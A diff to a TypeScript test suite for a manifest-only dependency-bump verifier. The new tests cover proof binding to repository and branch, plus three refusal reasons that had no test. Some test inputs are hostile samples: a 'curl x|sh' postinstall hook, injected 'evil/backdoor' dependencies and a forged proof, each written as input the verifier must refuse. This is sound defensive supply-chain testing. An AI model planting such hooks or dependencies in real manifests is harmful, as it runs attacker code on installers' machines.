@@ -22,6 +22,7 @@ import { describe, expect, it } from "vitest";
 import {
   RepoWriteRefusal,
   assertManifestEditProof,
+  assertMessageBound,
   assertWriteBranch,
   assertWritePath,
   assertWriteRepo,
@@ -82,7 +83,26 @@ const GO_MOD_BUMPED = GO_MOD_BASE.replace("v3.2.1", "v3.2.4");
 
 const GO_MOD_DECLARED = ["go.mod"];
 
-function goBumpInput(overrides: Partial<Parameters<typeof verifyManifestOnlyEdit>[0]> = {}) {
+/**
+ * The DESTINATION every fixture below is verified for. It is a shared constant rather than a per-test
+ * literal because `repo` and `headBranch` are now bound INTO the proof (a proof states that specific
+ * bytes may be written to a specific file on a specific branch of a specific repository), and the
+ * tests here are about the CONTENT gates — the destination binding gets its own block at the bottom.
+ */
+const FIXTURE_DESTINATION = { repo: "acme/widgets", headBranch: "scp/dep-bump/c1" } as const;
+
+/** `verifyManifestOnlyEdit` with this file's fixture destination filled in. Overridable, because the
+ *  destination-binding tests need to vary it. */
+function verifyEdit(
+  input: Omit<Parameters<typeof verifyManifestOnlyEdit>[0], "repo" | "headBranch"> &
+    Partial<Pick<Parameters<typeof verifyManifestOnlyEdit>[0], "repo" | "headBranch">>
+): ManifestEditProof {
+  return verifyManifestOnlyEdit({ ...FIXTURE_DESTINATION, ...input });
+}
+
+function goBumpInput(
+  overrides: Partial<Parameters<typeof verifyManifestOnlyEdit>[0]> = {}
+): Omit<Parameters<typeof verifyManifestOnlyEdit>[0], "repo" | "headBranch"> {
   return {
     path: "go.mod",
     declaredManifestPaths: GO_MOD_DECLARED,
@@ -102,7 +122,7 @@ function goBumpInput(overrides: Partial<Parameters<typeof verifyManifestOnlyEdit
 
 describe("verifyManifestOnlyEdit — the negative control", () => {
   it("ACCEPTS a single declared-version change and reports exactly what moved", () => {
-    const proof = verifyManifestOnlyEdit(goBumpInput());
+    const proof = verifyEdit(goBumpInput());
     expect(proof.path).toBe("go.mod");
     expect(proof.ecosystem).toBe("go");
     expect(proof.coordinate).toBe("github.com/Masterminds/semver/v3");
@@ -180,7 +200,7 @@ describe("verifyManifestOnlyEdit — the negative control", () => {
       "alpine"
     ]
   ])("ACCEPTS a real bump — %s", (_label, ecosystem, path, base, from, to, coordinate) => {
-    const proof = verifyManifestOnlyEdit({
+    const proof = verifyEdit({
       path,
       declaredManifestPaths: [path],
       ecosystem,
@@ -251,12 +271,12 @@ describe("path gates", () => {
 
   it("REFUSES a manifest the component's own inventory does not declare", () => {
     expectRefusal(
-      () => verifyManifestOnlyEdit(goBumpInput({ declaredManifestPaths: ["services/api/go.mod"] })),
+      () => verifyEdit(goBumpInput({ declaredManifestPaths: ["services/api/go.mod"] })),
       "not_declared_by_component"
     );
     // An empty declared set refuses everything — absence is never permission.
     expectRefusal(
-      () => verifyManifestOnlyEdit(goBumpInput({ declaredManifestPaths: [] })),
+      () => verifyEdit(goBumpInput({ declaredManifestPaths: [] })),
       "not_declared_by_component"
     );
   });
@@ -264,15 +284,12 @@ describe("path gates", () => {
 
 describe("content gates", () => {
   it("REFUSES a no-op edit", () => {
-    expectRefusal(
-      () => verifyManifestOnlyEdit(goBumpInput({ newContent: GO_MOD_BASE })),
-      "content_unchanged"
-    );
+    expectRefusal(() => verifyEdit(goBumpInput({ newContent: GO_MOD_BASE })), "content_unchanged");
   });
 
   it("REFUSES content carrying a NUL byte", () => {
     expectRefusal(
-      () => verifyManifestOnlyEdit(goBumpInput({ newContent: `${GO_MOD_BUMPED}\u0000` })),
+      () => verifyEdit(goBumpInput({ newContent: `${GO_MOD_BUMPED}\u0000` })),
       "content_not_text"
     );
   });
@@ -280,7 +297,7 @@ describe("content gates", () => {
   it("REFUSES content over the shared byte ceiling", () => {
     expectRefusal(
       () =>
-        verifyManifestOnlyEdit(
+        verifyEdit(
           goBumpInput({ newContent: `${GO_MOD_BUMPED}\n// ${"x".repeat(5 * 1024 * 1024)}` })
         ),
       "content_too_large"
@@ -290,14 +307,14 @@ describe("content gates", () => {
   it("REFUSES an edit that changes more than one line", () => {
     const twoLines = GO_MOD_BUMPED.replace("v1.8.0", "v1.8.1");
     expectRefusal(
-      () => verifyManifestOnlyEdit(goBumpInput({ newContent: twoLines })),
+      () => verifyEdit(goBumpInput({ newContent: twoLines })),
       "multiple_lines_changed"
     );
   });
 
   it("REFUSES an edit that adds or removes a line, even a blank one", () => {
     expectRefusal(
-      () => verifyManifestOnlyEdit(goBumpInput({ newContent: `${GO_MOD_BUMPED}\n` })),
+      () => verifyEdit(goBumpInput({ newContent: `${GO_MOD_BUMPED}\n` })),
       "multiple_lines_changed"
     );
   });
@@ -305,14 +322,14 @@ describe("content gates", () => {
   it("REFUSES an unparseable side rather than reading it as 'declares nothing'", () => {
     expectRefusal(
       () =>
-        verifyManifestOnlyEdit(
+        verifyEdit(
           goBumpInput({ baseContent: "<html>404</html>", newContent: "<html>405</html>" })
         ),
       "unparseable_base"
     );
     expectRefusal(
       () =>
-        verifyManifestOnlyEdit({
+        verifyEdit({
           path: "package.json",
           declaredManifestPaths: ["package.json"],
           ecosystem: "npm",
@@ -333,7 +350,7 @@ describe("the dependency SET may not change — the charter's 'never adds or rem
     );
     // Line count changes too — so this is pinned by the reason, which says which gate fired.
     expectRefusal(
-      () => verifyManifestOnlyEdit(goBumpInput({ newContent: withExtra })),
+      () => verifyEdit(goBumpInput({ newContent: withExtra })),
       "multiple_lines_changed"
     );
   });
@@ -345,10 +362,7 @@ describe("the dependency SET may not change — the charter's 'never adds or rem
       "\tgithub.com/spf13/cobra v1.8.0",
       "\tgithub.com/evil/backdoor v1.8.0"
     );
-    expectRefusal(
-      () => verifyManifestOnlyEdit(goBumpInput({ newContent: swapped })),
-      "dependency_set_changed"
-    );
+    expectRefusal(() => verifyEdit(goBumpInput({ newContent: swapped })), "dependency_set_changed");
   });
 
   it("REFUSES a re-scope (runtime -> dev) even when the version is untouched", () => {
@@ -356,7 +370,7 @@ describe("the dependency SET may not change — the charter's 'never adds or rem
     const moved = JSON.stringify({ devDependencies: { react: "^18.2.0" } }, null, 2);
     expectRefusal(
       () =>
-        verifyManifestOnlyEdit({
+        verifyEdit({
           path: "package.json",
           declaredManifestPaths: ["package.json"],
           ecosystem: "npm",
@@ -375,7 +389,7 @@ describe("exactly ONE already-declared version may move", () => {
     const edited = base.replace('title="app"', 'title="app2"');
     expectRefusal(
       () =>
-        verifyManifestOnlyEdit({
+        verifyEdit({
           path: "Dockerfile",
           declaredManifestPaths: ["Dockerfile"],
           ecosystem: "oci",
@@ -389,7 +403,7 @@ describe("exactly ONE already-declared version may move", () => {
 
   it("REFUSES a bump of a coordinate this subscription is not for", () => {
     expectRefusal(
-      () => verifyManifestOnlyEdit(goBumpInput({ coordinate: "github.com/spf13/cobra" })),
+      () => verifyEdit(goBumpInput({ coordinate: "github.com/spf13/cobra" })),
       "coordinate_not_expected"
     );
   });
@@ -399,7 +413,7 @@ describe("exactly ONE already-declared version may move", () => {
     const pinned = "requests==2.31.0\nurllib3==2.0.7\n";
     expectRefusal(
       () =>
-        verifyManifestOnlyEdit({
+        verifyEdit({
           path: "requirements.txt",
           declaredManifestPaths: ["requirements.txt"],
           ecosystem: "python",
@@ -418,7 +432,7 @@ describe("exactly ONE already-declared version may move", () => {
     // asserted by reason so this cannot be mistaken for the coordinate check firing.
     expectRefusal(
       () =>
-        verifyManifestOnlyEdit({
+        verifyEdit({
           path: "Dockerfile",
           declaredManifestPaths: ["Dockerfile"],
           ecosystem: "oci",
@@ -437,7 +451,7 @@ describe("exactly ONE already-declared version may move", () => {
     // Both must be reachable — an ordering that made either unreachable would be dead code
     // masquerading as a control.
     expectRefusal(
-      () => verifyManifestOnlyEdit(goBumpInput({ coordinate: "github.com/not/declared" })),
+      () => verifyEdit(goBumpInput({ coordinate: "github.com/not/declared" })),
       "coordinate_not_declared"
     );
   });
@@ -451,7 +465,7 @@ describe("the change must be confined to the version text", () => {
     const edited = '{"scripts":{"postinstall":"curl x|sh"},"dependencies":{"react":"^18.3.0"}}';
     expectRefusal(
       () =>
-        verifyManifestOnlyEdit({
+        verifyEdit({
           path: "package.json",
           declaredManifestPaths: ["package.json"],
           ecosystem: "npm",
@@ -466,7 +480,7 @@ describe("the change must be confined to the version text", () => {
   it("ACCEPTS an image bump that moves the tag AND its digest together — one literal, two parsed fields", () => {
     const base = "FROM ghcr.io/acme/base:1.2.3@sha256:" + "a".repeat(64) + "\n";
     const edited = "FROM ghcr.io/acme/base:1.2.4@sha256:" + "b".repeat(64) + "\n";
-    const proof = verifyManifestOnlyEdit({
+    const proof = verifyEdit({
       path: "Dockerfile",
       declaredManifestPaths: ["Dockerfile"],
       ecosystem: "oci",
@@ -485,9 +499,10 @@ describe("the change must be confined to the version text", () => {
 
 describe("ManifestEditProof", () => {
   it("accepts the content it was minted for", () => {
-    const proof = verifyManifestOnlyEdit(goBumpInput());
+    const proof = verifyEdit(goBumpInput());
     expect(() =>
       assertManifestEditProof("testprovider", {
+        ...FIXTURE_DESTINATION,
         path: "go.mod",
         content: GO_MOD_BUMPED,
         proof
@@ -496,10 +511,11 @@ describe("ManifestEditProof", () => {
   });
 
   it("REFUSES content mutated after verification — the proof binds to bytes, it does not travel with them", () => {
-    const proof = verifyManifestOnlyEdit(goBumpInput());
+    const proof = verifyEdit(goBumpInput());
     expectRefusal(
       () =>
         assertManifestEditProof("testprovider", {
+          ...FIXTURE_DESTINATION,
           path: "go.mod",
           content: `${GO_MOD_BUMPED}\nrequire github.com/evil/backdoor v1.0.0`,
           proof
@@ -509,10 +525,11 @@ describe("ManifestEditProof", () => {
   });
 
   it("REFUSES a proof minted for a different path", () => {
-    const proof = verifyManifestOnlyEdit(goBumpInput());
+    const proof = verifyEdit(goBumpInput());
     expectRefusal(
       () =>
         assertManifestEditProof("testprovider", {
+          ...FIXTURE_DESTINATION,
           path: "services/api/go.mod",
           content: GO_MOD_BUMPED,
           proof
@@ -527,6 +544,7 @@ describe("ManifestEditProof", () => {
     // and this test fails the moment the signature check is dropped from assertManifestEditProof.
     const evil = "module x\n\nrequire github.com/evil/backdoor v1.0.0\n";
     const forged: ManifestEditProof = {
+      ...FIXTURE_DESTINATION,
       path: "go.mod",
       ecosystem: "go",
       coordinate: "github.com/evil/backdoor",
@@ -538,9 +556,152 @@ describe("ManifestEditProof", () => {
     };
     expectRefusal(
       () =>
-        assertManifestEditProof("testprovider", { path: "go.mod", content: evil, proof: forged }),
+        assertManifestEditProof("testprovider", {
+          ...FIXTURE_DESTINATION,
+          path: "go.mod",
+          content: evil,
+          proof: forged
+        }),
       "proof_mismatch"
     );
+  });
+});
+
+/**
+ * ================================================================================================
+ * THE PROOF BINDS THE DESTINATION, NOT JUST THE CONTENT
+ * ================================================================================================
+ * The stated guarantee is "content that did not pass verification cannot reach a repository". Bound
+ * to path + content alone, it was one field short of that: a proof minted for `acme/widgets`'s bump
+ * branch verified cleanly against a publish of the same bytes at the same path to a DIFFERENT
+ * repository, or to the BASE branch — the two destinations that matter, since one is somebody else's
+ * repo and the other is the branch the pull request was supposed to target.
+ */
+describe("the proof binds WHERE the bytes may be written", () => {
+  it("names the repository and the branch it was minted for", () => {
+    const proof = verifyEdit(goBumpInput());
+    expect(proof.repo).toBe(FIXTURE_DESTINATION.repo);
+    expect(proof.headBranch).toBe(FIXTURE_DESTINATION.headBranch);
+  });
+
+  it("REFUSES a write to a different repository, with the same bytes at the same path", () => {
+    const proof = verifyEdit(goBumpInput());
+    expectRefusal(
+      () =>
+        assertManifestEditProof("testprovider", {
+          ...FIXTURE_DESTINATION,
+          repo: "acme/other-team-repo",
+          path: "go.mod",
+          content: GO_MOD_BUMPED,
+          proof
+        }),
+      "proof_mismatch"
+    );
+  });
+
+  it("REFUSES a write to a different branch — including the base branch the PR targets", () => {
+    const proof = verifyEdit(goBumpInput());
+    expectRefusal(
+      () =>
+        assertManifestEditProof("testprovider", {
+          ...FIXTURE_DESTINATION,
+          headBranch: "main",
+          path: "go.mod",
+          content: GO_MOD_BUMPED,
+          proof
+        }),
+      "proof_mismatch"
+    );
+  });
+
+  it("REFUSES a proof whose destination fields were rewritten after minting — the HMAC covers them", () => {
+    // Not the same test as the two above: those change the WRITE's destination, this changes the
+    // PROOF's. If `repo`/`headBranch` were compared but not signed, an attacker holding a valid
+    // proof could simply restate them and the equality checks would pass.
+    const proof = verifyEdit(goBumpInput());
+    const reaimed: ManifestEditProof = {
+      ...proof,
+      repo: "acme/other-team-repo",
+      headBranch: "main"
+    };
+    expectRefusal(
+      () =>
+        assertManifestEditProof("testprovider", {
+          repo: "acme/other-team-repo",
+          headBranch: "main",
+          path: "go.mod",
+          content: GO_MOD_BUMPED,
+          proof: reaimed
+        }),
+      "proof_mismatch"
+    );
+  });
+});
+
+/**
+ * ================================================================================================
+ * THE REFUSAL REASONS THAT HAD NO TEST
+ * ================================================================================================
+ * `RepoWriteRefusalReason`'s own doc says each reason is "stated as its own reason with its own test
+ * rather than folded into a generic 'invalid request'". A census of the enum against the suites found
+ * three with no assertion anywhere: `multiple_versions_changed`, `unbumpable_constraint` and
+ * `message_too_large`. A reason nothing asserts is indistinguishable from a branch that cannot fire,
+ * which is the difference between a control and a comment — so the doc is now true rather than
+ * narrowed.
+ */
+describe("the three reasons that had no test", () => {
+  it("REFUSES an edit that moves TWO declared versions on one line", () => {
+    // Must be ONE line, or gate 3 (`multiple_lines_changed`) catches it first and this reason stays
+    // unreachable. A minified package.json is exactly that shape.
+    const base = '{"dependencies":{"react":"^18.2.0","redux":"^4.0.0"}}';
+    const edited = '{"dependencies":{"react":"^18.3.0","redux":"^4.1.0"}}';
+    expectRefusal(
+      () =>
+        verifyEdit({
+          path: "package.json",
+          declaredManifestPaths: ["package.json"],
+          ecosystem: "npm",
+          baseContent: base,
+          newContent: edited,
+          coordinate: "react"
+        }),
+      "multiple_versions_changed"
+    );
+  });
+
+  it("REFUSES bumping a declaration whose version this package refuses to resolve", () => {
+    // A `git+https://` npm specifier NAMES A LOCATION, not a registry version line, so its
+    // constraint is `unresolved` on BOTH sides — the ref inside it moved, which makes it the one
+    // changed declaration, and there is still no declared VERSION to bump. Reaching this reason
+    // needs exactly that shape: the subscribed coordinate must be the one that CHANGED (or
+    // `coordinate_not_expected` fires first) and its constraint KIND must be unchanged (or
+    // `constraint_kind_changed` does). That narrowness is why it had no test.
+    const base = '{"dependencies":{"@acme/lib":"git+https://github.com/acme/lib#v1.2.3"}}';
+    const edited = '{"dependencies":{"@acme/lib":"git+https://github.com/acme/lib#v1.2.4"}}';
+    expectRefusal(
+      () =>
+        verifyEdit({
+          path: "package.json",
+          declaredManifestPaths: ["package.json"],
+          ecosystem: "npm",
+          baseContent: base,
+          newContent: edited,
+          coordinate: "@acme/lib"
+        }),
+      "unbumpable_constraint"
+    );
+  });
+
+  it("REFUSES a commit message / PR title / PR body over its bound", () => {
+    // The prose SCP writes is DERIVED from the descriptor, never passed in — but derived is not
+    // bounded: it is composed from a coordinate and two version tokens, all tenant-controlled. This
+    // is the gate that says so, and it had no test at all.
+    expectRefusal(
+      () => assertMessageBound("x".repeat(100_000), 72, "pull-request title"),
+      "message_too_large"
+    );
+    // …and the negative control, so this cannot pass by the bound refusing everything.
+    expect(() => assertMessageBound("chore(deps): bump", 72, "pull-request title")).not.toThrow();
   });
 });
 
